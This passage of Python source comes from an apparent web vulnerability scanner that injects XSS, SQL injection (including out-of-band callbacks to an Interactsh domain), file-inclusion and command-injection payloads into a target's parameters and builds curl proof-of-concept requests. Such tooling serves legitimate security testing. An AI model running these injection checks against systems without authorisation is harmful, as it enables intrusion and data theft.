        for header_name, header_value in headers.items():
            for pattern in patterns:
                if re.search(pattern, f"{header_name}: {header_value}", re.I):
                    report.detected_technologies.add(tech)
                    logger.debug(f"Detected technology: {tech} via header {header_name}")
                    break
            if tech in report.detected_technologies: break # Found in headers, move to next tech

        # Check content if not found in headers
        if tech not in report.detected_technologies:
            for pattern in patterns:
                if re.search(pattern, content, re.I):
                    report.detected_technologies.add(tech)
                    logger.debug(f"Detected technology: {tech} via content on {url}")
                    break

# --- Vulnerability Check Functions (Refined and New) ---

async def check_security_headers(session: aiohttp.ClientSession, report: ScanReport, concurrency_manager: AdaptiveConcurrencyManager, url: str, **kwargs):
    """Checks for missing or misconfigured security headers."""
    resp, _, headers, _, _, raw_req = await fetch_url(session, concurrency_manager, url, headers=report.session_headers)
    if not resp or not headers: return

    missing_headers = []
    misconfigured_headers = []

    # HSTS (Strict-Transport-Security)
    if 'strict-transport-security' not in headers:
        missing_headers.append("Strict-Transport-Security (HSTS)")
    elif not re.search(r"max-age=\d{7,}", headers.get('strict-transport-security', ''), re.I):
        misconfigured_headers.append("Strict-Transport-Security (HSTS) - max-age too low or missing")

    # CSP (Content-Security-Policy)
    if 'content-security-policy' not in headers:
        missing_headers.append("Content-Security-Policy (CSP)")
    # Basic check for unsafe-inline/eval (can be more complex)
    elif 'unsafe-inline' in headers.get('content-security-policy', '') or 'unsafe-eval' in headers.get('content-security-policy', ''):
        misconfigured_headers.append("Content-Security-Policy (CSP) - contains 'unsafe-inline' or 'unsafe-eval'")

    # X-Frame-Options
    if 'x-frame-options' not in headers:
        missing_headers.append("X-Frame-Options")
    elif headers.get('x-frame-options', '').lower() not in ['deny', 'sameorigin']:
        misconfigured_headers.append("X-Frame-Options - not set to 'DENY' or 'SAMEORIGIN'")

    # X-Content-Type-Options
    if 'x-content-type-options' not in headers or headers.get('x-content-type-options', '').lower() != 'nosniff':
        missing_headers.append("X-Content-Type-Options") # Report as missing if not nosniff

    # Referrer-Policy
    if 'referrer-policy' not in headers:
        missing_headers.append("Referrer-Policy")
    elif headers.get('referrer-policy', '').lower() not in ['no-referrer', 'same-origin', 'strict-origin', 'strict-origin-when-cross-origin']:
        misconfigured_headers.append("Referrer-Policy - weak or missing recommended value")

    # Permissions-Policy (Feature-Policy)
    if 'permissions-policy' not in headers and 'feature-policy' not in headers:
        missing_headers.append("Permissions-Policy (or Feature-Policy)")

    # X-XSS-Protection (Legacy, but still sometimes useful)
    if 'x-xss-protection' not in headers or '1; mode=block' not in headers.get('x-xss-protection', ''):
        missing_headers.append("X-XSS-Protection (legacy, but recommended '1; mode=block')")

    if missing_headers or misconfigured_headers:
        description = "Several critical security headers are missing or misconfigured, potentially exposing the application to various client-side attacks."
        evidence = f"Missing Headers: {', '.join(missing_headers) or 'None'}\nMisconfigured Headers: {', '.join(misconfigured_headers) or 'None'}"
        remediation = "Implement or correctly configure the identified security headers. Refer to OWASP Cheat Sheet Series for detailed guidance."
        remediation_steps = [
            "**Strict-Transport-Security (HSTS):** Set `Strict-Transport-Security: max-age=31536000; includeSubDomains; preload` to enforce HTTPS.",
            "**Content-Security-Policy (CSP):** Implement a strict CSP to prevent XSS and data injection. Avoid `unsafe-inline` and `unsafe-eval`.",
            "**X-Frame-Options:** Set `X-Frame-Options: DENY` or `SAMEORIGIN` to prevent clickjacking.",
            "**X-Content-Type-Options:** Set `X-Content-Type-Options: nosniff` to prevent MIME-sniffing attacks.",
            "**Referrer-Policy:** Set `Referrer-Policy: strict-origin-when-cross-origin` or stricter to control referrer information leakage.",
            "**Permissions-Policy:** Define a Permissions-Policy to control browser features accessible to the page.",
            "**X-XSS-Protection:** Although deprecated by CSP, set `X-XSS-Protection: 1; mode=block` for older browser compatibility."
        ]
        report.add_finding("Security Headers Missing/Misconfigured", description, "Low", "Firm",
                           evidence, remediation, url, request_details=raw_req, response_details=str(resp.headers),
                           remediation_steps=remediation_steps)

async def check_xss(session: aiohttp.ClientSession, report: ScanReport, concurrency_manager: AdaptiveConcurrencyManager, url: str, params_map: Dict[str, List[Dict[str, Any]]], cli_args: argparse.Namespace, **kwargs):
    """
    Checks for Reflected XSS (Cross-Site Scripting) vulnerabilities.
    Iterates through discovered parameters and injects XSS payloads.
    """
    # Get parameters for the current URL, including from its base if it's a query URL
    url_base_for_params = urlparse(url)._replace(query="").geturl()
    parameters_to_test = params_map.get(url, []) + params_map.get(url_base_for_params, [])
    
    if not parameters_to_test:
        logger.debug(f"No parameters found for XSS check on {url}")
        return

    payload_count = PAYLOAD_LEVEL_MAP.get(cli_args.payload_level, PAYLOAD_LEVEL_MAP["medium"])
    payloads_to_try = random.sample(XSS_PAYLOADS, min(payload_count, len(XSS_PAYLOADS)))

    for param_info in parameters_to_test:
        param_name = param_info['name']
        original_value = param_info['value']
        param_method = param_info['method']

        for payload in payloads_to_try:
            # Apply various encodings to the payload
            encoded_payloads = _apply_payload_encodings(payload)

            for encoded_p in encoded_payloads:
                test_params = {p['name']: p['value'] for p in parameters_to_test} # Copy all params
                test_params[param_name] = encoded_p # Inject payload into current parameter

                resp, content, headers, final_url, duration, raw_req = None, None, None, None, None, None

                # Construct request based on method
                if param_method == "GET":
                    resp, content, headers, final_url, duration, raw_req = await fetch_url(
                        session, concurrency_manager, url, method="GET", params=test_params, proxy=cli_args.proxy, headers=report.session_headers
                    )
                elif param_method == "POST":
                    # For POST, if original was form-urlencoded, use data dict; if JSON, use json dict
                    # Simple heuristic: if original value was empty or simple, assume form-urlencoded
                    # More advanced: check Content-Type of original request if available
                    data_to_send = test_params
                    resp, content, headers, final_url, duration, raw_req = await fetch_url(
                        session, concurrency_manager, url, method="POST", data=data_to_send, proxy=cli_args.proxy, headers=report.session_headers
                    )

                if not resp or not content or not final_url:
                    continue

                # Check for XSS reflection
                # Look for the payload directly in the response body
                if encoded_p in content:
                    # Further checks for execution context
                    if "<script>" in encoded_p.lower() and "<script>" in content.lower():
                        # Simple script reflection
                        report.add_finding(
                            "Reflected XSS (Script Tag)",
                            f"The payload '{escape(encoded_p)}' was reflected directly into the HTML within a script tag, indicating a potential XSS vulnerability.",
                            "High", "Firm",
                            f"Payload '{escape(encoded_p)}' reflected in response. Look for the payload in the source code.",
                            "Properly sanitize all user input before rendering it in HTML, especially in script contexts. Use output encoding specific to the context (HTML, URL, JavaScript).",
                            final_url, param_name, request_details=raw_req, response_details=content,
                            poc_notes=f"Payload: {payload}\nEncoded: {encoded_p}",
                            curl_poc=generate_poc(final_url, param_method, resp.request_info.headers, test_params if param_method == "GET" else data_to_send, raw_req)[0],
                            python_poc=generate_poc(final_url, param_method, resp.request_info.headers, test_params if param_method == "GET" else data_to_send, raw_req)[1],
                            poc_steps=[
                                f"Navigate to: {final_url}",
                                f"Submit {param_method} request with parameter '{param_name}' set to: `{escape(payload)}` (or its encoded form: `{escape(encoded_p)}`)",
                                "Observe the browser executing the injected script (e.g., an alert box)."
                            ],
                            remediation_steps=[
                                "Implement context-aware output encoding for all user-supplied data.",
                                "Use a robust XSS prevention library (e.g., OWASP ESAPI, DOMPurify for client-side).",
                                "Set a strict Content-Security-Policy (CSP) to mitigate XSS attacks."
                            ]
                        )
                        return # Found XSS, no need to test more payloads for this param/URL

                    elif "<img src=x onerror=" in encoded_p.lower() and "onerror" in content.lower():
                        # Error-based image XSS
                        report.add_finding(
                            "Reflected XSS (Image Error)",
                            f"The payload '{escape(encoded_p)}' which attempts to trigger an XSS via an image onerror event was reflected, indicating a potential XSS vulnerability.",
                            "High", "Firm",
                            f"Payload '{escape(encoded_p)}' reflected in response. Look for the payload in the source code.",
                            "Sanitize all user input before rendering it in HTML attributes. Ensure proper attribute-specific encoding.",
                            final_url, param_name, request_details=raw_req, response_details=content,
                            poc_notes=f"Payload: {payload}\nEncoded: {encoded_p}",
                            curl_poc=generate_poc(final_url, param_method, resp.request_info.headers, test_params if param_method == "GET" else data_to_send, raw_req)[0],
                            python_poc=generate_poc(final_url, param_method, resp.request_info.headers, test_params if param_method == "GET" else data_to_send, raw_req)[1],
                            poc_steps=[
                                f"Navigate to: {final_url}",
                                f"Submit {param_method} request with parameter '{param_name}' set to: `{escape(payload)}` (or its encoded form: `{escape(encoded_p)}`)",
                                "Observe the browser executing the injected script (e.g., an alert box)."
                            ],
                            remediation_steps=[
                                "Implement context-aware output encoding for all user-supplied data.",
                                "Use a robust XSS prevention library (e.g., OWASP ESAPI, DOMPurify for client-side).",
                                "Set a strict Content-Security-Policy (CSP) to mitigate XSS attacks."
                            ]
                        )
                        return

                    elif "<svg/onload=" in encoded_p.lower() and "onload" in content.lower():
                        # SVG onload XSS
                        report.add_finding(
                            "Reflected XSS (SVG Onload)",
                            f"The payload '{escape(encoded_p)}' which attempts to trigger an XSS via an SVG onload event was reflected, indicating a potential XSS vulnerability.",
                            "High", "Firm",
                            f"Payload '{escape(encoded_p)}' reflected in response. Look for the payload in the source code.",
                            "Sanitize all user input before rendering it in SVG contexts. Ensure proper attribute-specific encoding.",
                            final_url, param_name, request_details=raw_req, response_details=content,
                            poc_notes=f"Payload: {payload}\nEncoded: {encoded_p}",
                            curl_poc=generate_poc(final_url, param_method, resp.request_info.headers, test_params if param_method == "GET" else data_to_send, raw_req)[0],
                            python_poc=generate_poc(final_url, param_method, resp.request_info.headers, test_params if param_method == "GET" else data_to_send, raw_req)[1],
                            poc_steps=[
                                f"Navigate to: {final_url}",
                                f"Submit {param_method} request with parameter '{param_name}' set to: `{escape(payload)}` (or its encoded form: `{escape(encoded_p)}`)",
                                "Observe the browser executing the injected script (e.g., an alert box)."
                            ],
                            remediation_steps=[
                                "Implement context-aware output encoding for all user-supplied data.",
                                "Use a robust XSS prevention library (e.g., OWASP ESAPI, DOMPurify for client-side).",
                                "Set a strict Content-Security-Policy (CSP) to mitigate XSS attacks."
                            ]
                        )
                        return
                    
                    # Basic reflection check (could be HTML injection or general reflection)
                    elif is_response_anomalous(report, final_url, resp, content, duration):
                        report.add_finding(
                            "Reflected XSS (Potential)",
                            f"The payload '{escape(encoded_p)}' was reflected in the response, and the response was anomalous (e.g., changed length, status code). This indicates a potential XSS or HTML injection.",
                            "Medium", "Tentative",
                            f"Payload: {encoded_p} reflected in response. Response was anomalous.",
                            "Thoroughly sanitize and encode all user-supplied data before rendering it in HTML. Implement a robust Content Security Policy (CSP).",
                            final_url, param_name, request_details=raw_req, response_details=content,
                            poc_notes=f"Payload: {payload}\nEncoded: {encoded_p}",
                            curl_poc=generate_poc(final_url, param_method, resp.request_info.headers, test_params if param_method == "GET" else data_to_send, raw_req)[0],
                            python_poc=generate_poc(final_url, param_method, resp.request_info.headers, test_params if param_method == "GET" else data_to_send, raw_req)[1],
                            poc_steps=[
                                f"Navigate to: {final_url}",
                                f"Submit {param_method} request with parameter '{param_name}' set to: `{escape(payload)}` (or its encoded form: `{escape(encoded_p)}`)",
                                "Manually inspect the page source for reflection and potential execution."
                            ],
                            remediation_steps=[
                                "Implement context-aware output encoding for all user-supplied data.",
                                "Use a robust XSS prevention library (e.g., OWASP ESAPI, DOMPurify for client-side).",
                                "Set a strict Content-Security-Policy (CSP) to mitigate XSS attacks."
                            ]
                        )
                        # Do NOT return here, as other payloads might reveal more direct XSS
                
                # Check for header-based XSS (e.g., User-Agent, Referer reflection)
                # This check would require modifying request headers, not just parameters.
                # It's a separate check or part of a broader "Header Injection" module.
                # For now, we focus on parameter injection.

async def check_dom_xss(browser_page: Page, report: ScanReport, concurrency_manager: AdaptiveConcurrencyManager, url: str, params_map: Dict[str, List[Dict[str, Any]]], cli_args: argparse.Namespace, **kwargs):
    """
    Checks for DOM-based XSS using a headless browser (Playwright).
    Injects payloads and monitors for console errors, alerts, or specific DOM modifications.
    """
    if not browser_page:
        logger.debug(f"Skipping DOM XSS check for {url}: Playwright browser page not available.")
        return

    logger.debug(f"Starting DOM XSS check for {url}")
    
    # Get parameters for the current URL
    url_base_for_params = urlparse(url)._replace(query="").geturl()
    parameters_to_test = params_map.get(url, []) + params_map.get(url_base_for_params, [])

    if not parameters_to_test:
        logger.debug(f"No parameters found for DOM XSS check on {url}")
        return

    payload_count = PAYLOAD_LEVEL_MAP.get(cli_args.payload_level, PAYLOAD_LEVEL_MAP["medium"])
    payloads_to_try = random.sample(DOM_XSS_PAYLOADS, min(payload_count, len(DOM_XSS_PAYLOADS)))

    for param_info in parameters_to_test:
        param_name = param_info['name']
        original_value = param_info['value']
        param_method = param_info['method']

        for payload in payloads_to_try:
            # Apply basic URL encoding for initial injection point
            encoded_p = quote_plus(payload)

            test_url = url
            test_data = None
            
            # Construct the URL or data based on the parameter's method
            if param_method == "GET":
                # Assuming query parameters
                parsed_url = urlparse(url)
                query_params = parse_qs(parsed_url.query)
                query_params[param_name] = [encoded_p] # Update or add the parameter
                test_url = parsed_url._replace(query=urlencode(query_params, doseq=True)).geturl()
            elif param_method == "POST":
                # For POST, we'll need to construct form data or JSON data
                # This is a simplification; real-world POST DOM XSS needs more context
                # For now, we'll try to put it in query string for simplicity or skip if complex POST
                logger.debug(f"Skipping complex POST DOM XSS for {url} parameter {param_name}")
                continue

            # Monitor for alerts and console messages
            alert_triggered = asyncio.Event()
            console_messages = []
            
            def handle_dialog(dialog):
                if dialog.type == "alert" and PLAYWRIGHT_DOM_XSS_MARKER in dialog.message:
                    logger.info(f"DOM XSS Alert triggered: {dialog.message}")
                    alert_triggered.set()
                dialog.dismiss() # Always dismiss dialogs to prevent blocking

            def handle_console_message(msg):
                console_messages.append(msg.text)
                if PLAYWRIGHT_DOM_XSS_MARKER in msg.text:
                    logger.info(f"DOM XSS Marker found in console: {msg.text}")
                    alert_triggered.set() # Treat console marker as a hit

            browser_page.on("dialog", handle_dialog)
            browser_page.on("console", handle_console_message)

            screenshot_path = None
            try:
                # Navigate to the test URL
                await browser_page.goto(test_url, wait_until="networkidle", timeout=PLAYWRIGHT_TIMEOUT)

                # Wait a bit for JS to execute and potentially trigger XSS
                await asyncio.sleep(1) # Give JS time to run

                # Check if the alert was triggered or marker found in console
                if alert_triggered.is_set():
                    logger.info(f"DOM XSS detected on {url} with payload {payload} (param: {param_name})")
                    
                    # Capture screenshot
                    screenshot_filename = f"dom_xss_{uuid.uuid4()}.png"
                    screenshot_path = os.path.join(DOWNLOADS_FOLDER, screenshot_filename)
                    if not os.path.exists(DOWNLOADS_FOLDER):
                        os.makedirs(DOWNLOADS_FOLDER)
                    await browser_page.screenshot(path=screenshot_path)
                    logger.info(f"Screenshot saved to {screenshot_path}")

                    report.add_finding(
                        "DOM XSS (Client-Side)",
                        f"A DOM-based XSS vulnerability was detected. The payload '{escape(payload)}' (or its encoded form) injected into parameter '{param_name}' led to JavaScript execution in the browser.",
                        "High", "Confirmed",
                        f"Payload: {payload}\nInjected URL: {test_url}\nConsole Messages: {'; '.join(console_messages)}\nScreenshot: {screenshot_filename}",
                        "Sanitize and encode all data before it's written to the DOM. Avoid using `innerHTML`, `document.write`, `eval`, or `setTimeout` with user-controlled input. Use safe DOM manipulation methods like `textContent`.",
                        url, param_name,
                        poc_notes=f"Payload: {payload}\nInjected URL: {test_url}\nConsole Output: {'; '.join(console_messages)}",
                        poc_steps=[
                            f"Open browser and navigate to: `{escape(test_url)}`",
                            "Observe the JavaScript execution (e.g., an alert box or console message containing the marker)."
                        ],
                        remediation_steps=[
                            "**Context-Aware Output Encoding:** Ensure all user-supplied data is properly encoded before being inserted into HTML, especially into JavaScript contexts.",
                            "**Avoid Dangerous Sinks:** Do not use `innerHTML`, `document.write`, `eval()`, `setTimeout()`, `setInterval()`, or `new Function()` with untrusted input.",
                            "**Use Safe DOM APIs:** Prefer `textContent` or `innerText` over `innerHTML` when inserting text. For attributes, use `element.setAttribute()` with proper encoding.",
                            "**Client-Side Sanitization:** Implement client-side input validation and sanitization, but always assume it can be bypassed and perform server-side validation as well.",
                            "**Content Security Policy (CSP):** Implement a strict CSP to restrict what JavaScript can execute and from where."
                        ],
                        screenshot_path=screenshot_path
                    )
                    return # Found DOM XSS, no need to test more payloads for this param/URL

            except PlaywrightTimeoutError:
                logger.debug(f"Playwright navigation timed out for DOM XSS check on {test_url}")
            except PlaywrightError as e:
                report.add_error(f"Playwright error during DOM XSS check on {test_url}: {e}", test_url, "DOM XSS")
            except Exception as e:
                report.add_error(f"Unexpected error during DOM XSS check on {test_url}: {e}", test_url, "DOM XSS")
            finally:
                # Remove event listeners to prevent memory leaks or unintended triggers
                browser_page.remove_listener("dialog", handle_dialog)
                browser_page.remove_listener("console", handle_console_message)

async def check_sqli(session: aiohttp.ClientSession, report: ScanReport, concurrency_manager: AdaptiveConcurrencyManager, url: str, params_map: Dict[str, List[Dict[str, Any]]], cli_args: argparse.Namespace, interactsh_client: Optional[InteractshClient], **kwargs):
    """
    Checks for SQL Injection (SQLi) vulnerabilities.
    Includes error-based, boolean-based blind, time-based blind, and OOB SQLi.
    """
    url_base_for_params = urlparse(url)._replace(query="").geturl()
    parameters_to_test = params_map.get(url, []) + params_map.get(url_base_for_params, [])

    if not parameters_to_test:
        logger.debug(f"No parameters found for SQLi check on {url}")
        return

    payload_count = PAYLOAD_LEVEL_MAP.get(cli_args.payload_level, PAYLOAD_LEVEL_MAP["medium"])
    sqli_payloads_to_try = random.sample(SQLI_PAYLOADS, min(payload_count, len(SQLI_PAYLOADS)))
    oob_sqli_payloads_to_try = random.sample(OOB_SQLI_PAYLOADS, min(payload_count, len(OOB_SQLI_PAYLOADS))) if interactsh_client else []

    # Get baseline for anomaly detection
    baseline = report.baseline_profiles.get(normalize_url(url))
    if not baseline:
        logger.warning(f"No baseline for {url}, skipping anomaly-based SQLi checks.")
        return # Skip if no baseline is available (should be built by scan_target now)

    for param_info in parameters_to_test:
        param_name = param_info['name']
        original_value = param_info['value']
        param_method = param_info['method']

        # Test Error-Based and Boolean/Time-Based SQLi
        for payload in sqli_payloads_to_try:
            test_params = {p['name']: p['value'] for p in parameters_to_test}
            test_params[param_name] = original_value + payload # Append payload

            resp, content, headers, final_url, duration, raw_req = None, None, None, None, None, None
            
            if param_method == "GET":
                resp, content, headers, final_url, duration, raw_req = await fetch_url(
                    session, concurrency_manager, url, method="GET", params=test_params, proxy=cli_args.proxy, headers=report.session_headers
                )
            elif param_method == "POST":
                data_to_send = test_params
                resp, content, headers, final_url, duration, raw_req = await fetch_url(
                    session, concurrency_manager, url, method="POST", data=data_to_send, proxy=cli_args.proxy, headers=report.session_headers
                )
            
            if not resp or not content or not final_url:
                continue

            # Error-Based SQLi Detection
            for error_type, error_pattern in ERROR_FINGERPRINTS.items():
                if error_type == "SQL" and re.search(error_pattern, content):
                    report.add_finding(
                        "Error-Based SQL Injection",
                        f"SQL error message detected in response to payload '{escape(payload)}' injected into parameter '{param_name}'.",
                        "High", "Confirmed",
                        f"Payload: {payload}\nError snippet: {content[:500]}",
                        "Implement parameterized queries or prepared statements. Avoid dynamic SQL query construction. Sanitize and validate all user input.",
                        final_url, param_name, request_details=raw_req, response_details=content,
                        poc_notes=f"Payload: {payload}",
                        curl_poc=generate_poc(final_url, param_method, resp.request_info.headers, test_params if param_method == "GET" else data_to_send, raw_req)[0],
                        python_poc=generate_poc(final_url, param_method, resp.request_info.headers, test_params if param_method == "GET" else data_to_send, raw_req)[1],
                        poc_steps=[
                            f"Send {param_method} request to {final_url} with parameter '{param_name}' set to: `{escape(original_value + payload)}`",
                            "Observe the server's response for SQL error messages."
                        ],
                        remediation_steps=[
                            "**Use Prepared Statements/Parameterized Queries:** This is the most effective defense against SQL injection. Separate SQL code from user-supplied data.",
                            "**Input Validation:** Validate all user input for type, length, format, and content. Use whitelisting where possible.",
                            "**Least Privilege:** Configure database users with the fewest privileges necessary.",
                            "**Error Handling:** Implement generic error messages to avoid leaking database details."
                        ]
                    )
                    return # Found, move to next parameter

            # Boolean-Based Blind SQLi Detection (simple differential analysis)
            # Check if the response is significantly different from the baseline (e.g., for 'AND 1=1' vs 'AND 1=2')
            if "1=1" in payload and is_response_anomalous(report, final_url, resp, content, duration):
                # This is a heuristic. A more robust check would involve comparing '1=1' response with '1=2' response.
                # For now, if '1=1' causes an anomaly, it's a potential indicator.
                report.add_finding(
                    "Boolean-Based Blind SQL Injection (Potential)",
                    f"The payload '{escape(payload)}' caused an anomalous response (e.g., content change, status code change), suggesting a potential boolean-based blind SQLi.",
                    "Medium", "Tentative",
                    f"Payload: {payload}\nResponse was anomalous compared to baseline.",
                    "Implement parameterized queries or prepared statements. Validate and sanitize all user input. Manually verify this finding.",
                    final_url, param_name, request_details=raw_req, response_details=content,
                    poc_notes=f"Payload: {payload}",
                    curl_poc=generate_poc(final_url, param_method, resp.request_info.headers, test_params if param_method == "GET" else data_to_send, raw_req)[0],
                    python_poc=generate_poc(final_url, param_method, resp.request_info.headers, test_params if param_method == "GET" else data_to_send, raw_req)[1],
                    poc_steps=[
                        f"Send {param_method} request to {final_url} with parameter '{param_name}' set to: `{escape(original_value + payload)}`",
                        "Compare the response to a normal response. Look for subtle differences in content or structure."
                    ],
                    remediation_steps=[
                        "**Use Prepared Statements/Parameterized Queries:** This is the most effective defense against SQL injection. Separate SQL code from user-supplied data.",
                        "**Input Validation:** Validate all user input for type, length, format, and content. Use whitelisting where possible.",
                        "**Least Privilege:** Configure database users with the fewest privileges necessary.",
                        "**Error Handling:** Implement generic error messages to avoid leaking database details."
                    ]
                )
                # Do NOT return here, as other payloads might reveal more direct SQLi

            # Time-Based Blind SQLi Detection
            if "SLEEP" in payload.upper() or "WAITFOR DELAY" in payload.upper() or "BENCHMARK" in payload.upper():
                if duration and duration > TIME_BASED_BLIND_DELAY * 0.8: # Check if response time is significantly longer than expected delay
                    report.add_finding(
                        "Time-Based Blind SQL Injection",
                        f"The payload '{escape(payload)}' caused a significant delay ({duration:.2f}s), indicating a time-based blind SQL Injection vulnerability.",
                        "High", "Confirmed",
                        f"Payload: {payload}\nResponse time: {duration:.2f}s (expected ~{TIME_BASED_BLIND_DELAY}s delay)",
                        "Implement parameterized queries or prepared statements. Validate and sanitize all user input. This is a confirmed vulnerability.",
                        final_url, param_name, request_details=raw_req, response_details=content,
                        poc_notes=f"Payload: {payload}",
                        curl_poc=generate_poc(final_url, param_method, resp.request_info.headers, test_params if param_method == "GET" else data_to_send, raw_req)[0],
                        python_poc=generate_poc(final_url, param_method, resp.request_info.headers, test_params if param_method == "GET" else data_to_send, raw_req)[1],
                        poc_steps=[
                            f"Send {param_method} request to {final_url} with parameter '{param_name}' set to: `{escape(original_value + payload)}`",
                            f"Measure the response time. A delay of approximately {TIME_BASED_BLIND_DELAY} seconds confirms the vulnerability."
                        ],
                        remediation_steps=[
                            "**Use Prepared Statements/Parameterized Queries:** This is the most effective defense against SQL injection. Separate SQL code from user-supplied data.",
                            "**Input Validation:** Validate all user input for type, length, format, and content. Use whitelisting where possible.",
                            "**Least Privilege:** Configure database users with the fewest privileges necessary.",
                            "**Error Handling:** Implement generic error messages to avoid leaking database details."
                        ]
                    )
                    return # Found, move to next parameter

        # Test OOB SQLi (if Interactsh is enabled)
        for payload in oob_sqli_payloads_to_try:
            if not interactsh_client: continue # Skip if no client

            unique_oob_id = str(uuid.uuid4())
            oob_payload = interactsh_client.get_oob_payload(payload.replace("{{INTERACTSH_DOMAIN}}", f"{unique_oob_id}.{{INTERACTSH_DOMAIN}}"))

            test_params = {p['name']: p['value'] for p in parameters_to_test}
            test_params[param_name] = original_value + oob_payload

            resp, content, headers, final_url, duration, raw_req = None, None, None, None, None, None

            if param_method == "GET":
                resp, content, headers, final_url, duration, raw_req = await fetch_url(
                    session, concurrency_manager, url, method="GET", params=test_params, proxy=cli_args.proxy, headers=report.session_headers
                )
            elif param_method == "POST":
                data_to_send = test_params
                resp, content, headers, final_url, duration, raw_req = await fetch_url(
                    session, concurrency_manager, url, method="POST", data=data_to_send, proxy=cli_args.proxy, headers=report.session_headers
                )
            
            if not resp or not content or not final_url:
                continue

            # Check for OOB interaction
            interaction = interactsh_client.check_for_interaction(unique_oob_id)
            if interaction:
                report.add_finding(
                    "OOB SQL Injection",
                    f"An Out-of-Band (OOB) interaction was detected for payload '{escape(oob_payload)}' injected into parameter '{param_name}', indicating an OOB SQL Injection vulnerability.",
                    "Critical", "Confirmed",
                    f"Payload: {oob_payload}\nOOB Interaction: {json.dumps(interaction, indent=2)}",
                    "Implement parameterized queries or prepared statements. Validate and sanitize all user input. This is a confirmed critical vulnerability.",
                    final_url, param_name, request_details=raw_req, response_details=content,
                    poc_notes=f"Payload: {oob_payload}\nInteractsh ID: {unique_oob_id}",
                    curl_poc=generate_poc(final_url, param_method, resp.request_info.headers, test_params if param_method == "GET" else data_to_send, raw_req)[0],
                    python_poc=generate_poc(final_url, param_method, resp.request_info.headers, test_params if param_method == "GET" else data_to_send, raw_req)[1],
                    oob_interaction=interaction,
                    poc_steps=[
                        f"Configure an Interactsh client (e.g., `interactsh-client -s {interactsh_client.interactsh_server}`).",
                        f"Send {param_method} request to {final_url} with parameter '{param_name}' set to: `{escape(original_value + oob_payload)}`",
                        f"Monitor your Interactsh client for an incoming interaction containing `{unique_oob_id}`."
                    ],
                    remediation_steps=[
                        "**Use Prepared Statements/Parameterized Queries:** This is the most effective defense against SQL injection. Separate SQL code from user-supplied data.",
                        "**Input Validation:** Validate all user input for type, length, format, and content. Use whitelisting where possible.",
                        "**Network Segmentation:** Restrict outbound connections from database servers to prevent OOB exfiltration.",
                        "**Least Privilege:** Configure database users with the fewest privileges necessary."
                    ]
                )
                return # Found, move to next parameter

async def check_lfi(session: aiohttp.ClientSession, report: ScanReport, concurrency_manager: AdaptiveConcurrencyManager, url: str, params_map: Dict[str, List[Dict[str, Any]]], cli_args: argparse.Namespace, **kwargs):
    """
    Checks for Local File Inclusion (LFI) and Path Traversal vulnerabilities.
    """
    url_base_for_params = urlparse(url)._replace(query="").geturl()
    parameters_to_test = params_map.get(url, []) + params_map.get(url_base_for_params, [])

    if not parameters_to_test:
        logger.debug(f"No parameters found for LFI check on {url}")
        return

    payload_count = PAYLOAD_LEVEL_MAP.get(cli_args.payload_level, PAYLOAD_LEVEL_MAP["medium"])
    lfi_payloads_to_try = random.sample(LFI_PAYLOADS, min(payload_count, len(LFI_PAYLOADS)))

    for param_info in parameters_to_test:
        param_name = param_info['name']
        original_value = param_info['value']
        param_method = param_info['method']

        for payload in lfi_payloads_to_try:
            test_params = {p['name']: p['value'] for p in parameters_to_test}
            test_params[param_name] = payload # Replace value with LFI payload

            resp, content, _, final_url, _, raw_req = None, None, None, None, None, None
            
            if param_method == "GET":
                resp, content, _, final_url, _, raw_req = await fetch_url(
                    session, concurrency_manager, url, method="GET", params=test_params, proxy=cli_args.proxy, headers=report.session_headers
                )
            elif param_method == "POST":
                data_to_send = test_params
                resp, content, _, final_url, _, raw_req = await fetch_url(
                    session, concurrency_manager, url, method="POST", data=data_to_send, proxy=cli_args.proxy, headers=report.session_headers
                )
            
            if not resp or not content or not final_url:
                continue

            # Check for LFI indicators
            for error_type, error_pattern in ERROR_FINGERPRINTS.items():
                if error_type == "LFI/PATH_TRAVERSAL" and re.search(error_pattern, content):
                    report.add_finding(
                        "Local File Inclusion / Path Traversal",
                        f"File content or error message indicating LFI/Path Traversal detected with payload '{escape(payload)}' in parameter '{param_name}'.",
                        "High", "Confirmed",
                        f"Payload: {payload}\nResponse snippet: {content[:500]}",
                        "Implement strict input validation for file paths. Use whitelisting for allowed file names/paths. Avoid directly concatenating user input into file system operations.",
                        final_url, param_name, request_details=raw_req, response_details=content,
                        poc_notes=f"Payload: {payload}",
                        curl_poc=generate_poc(final_url, param_method, resp.request_info.headers, test_params if param_method == "GET" else data_to_send, raw_req)[0],
                        python_poc=generate_poc(final_url, param_method, resp.request_info.headers, test_params if param_method == "GET" else data_to_send, raw_req)[1],
                        poc_steps=[
                            f"Send {param_method} request to {final_url} with parameter '{param_name}' set to: `{escape(payload)}`",
                            "Observe the response for file contents (e.g., `/etc/passwd` content) or error messages indicating file access."
                        ],
                        remediation_steps=[
                            "**Strict Input Validation:** Validate all user-supplied input that refers to file paths. Use a whitelist of allowed characters and paths.",
                            "**Canonicalization:** Ensure that file paths are properly canonicalized (resolved to their absolute, real path) before use.",
                            "**Avoid Direct Concatenation:** Never directly concatenate user input into file system functions or commands.",
                            "**Least Privilege:** Ensure the application runs with the minimum necessary file system permissions."
                        ]
                    )
                    return # Found, move to next parameter

async def check_command_injection(session: aiohttp.ClientSession, report: ScanReport, concurrency_manager: AdaptiveConcurrencyManager, url: str, params_map: Dict[str, List[Dict[str, Any]]], cli_args: argparse.Namespace, interactsh_client: Optional[InteractshClient], **kwargs):
    """
    Checks for Command Injection vulnerabilities.
    Includes in-band and OOB command injection.
    """
    url_base_for_params = urlparse(url)._replace(query="").geturl()
    parameters_to_test = params_map.get(url, []) + params_map.get(url_base_for_params, [])

    if not parameters_to_test:
        logger.debug(f"No parameters found for Command Injection check on {url}")
        return

    payload_count = PAYLOAD_LEVEL_MAP.get(cli_args.payload_level, PAYLOAD_LEVEL_MAP["medium"])
    cmd_payloads_to_try = random.sample(COMMAND_INJECTION_PAYLOADS, min(payload_count, len(COMMAND_INJECTION_PAYLOADS)))
    oob_cmd_payloads_to_try = random.sample(OOB_CMD_PAYLOADS, min(payload_count, len(OOB_CMD_PAYLOADS))) if interactsh_client else []

    for param_info in parameters_to_test:
        param_name = param_info['name']
        original_value = param_info['value']
        param_method = param_info['method']

        # Test In-Band Command Injection
        for payload in cmd_payloads_to_try:
            test_params = {p['name']: p['value'] for p in parameters_to_test}
            test_params[param_name] = original_value + payload

            resp, content, _, final_url, _, raw_req = None, None, None, None, None, None
            
            if param_method == "GET":
                resp, content, _, final_url, _, raw_req = await fetch_url(
                    session, concurrency_manager, url, method="GET", params=test_params, proxy=cli_args.proxy, headers=report.session_headers
                )
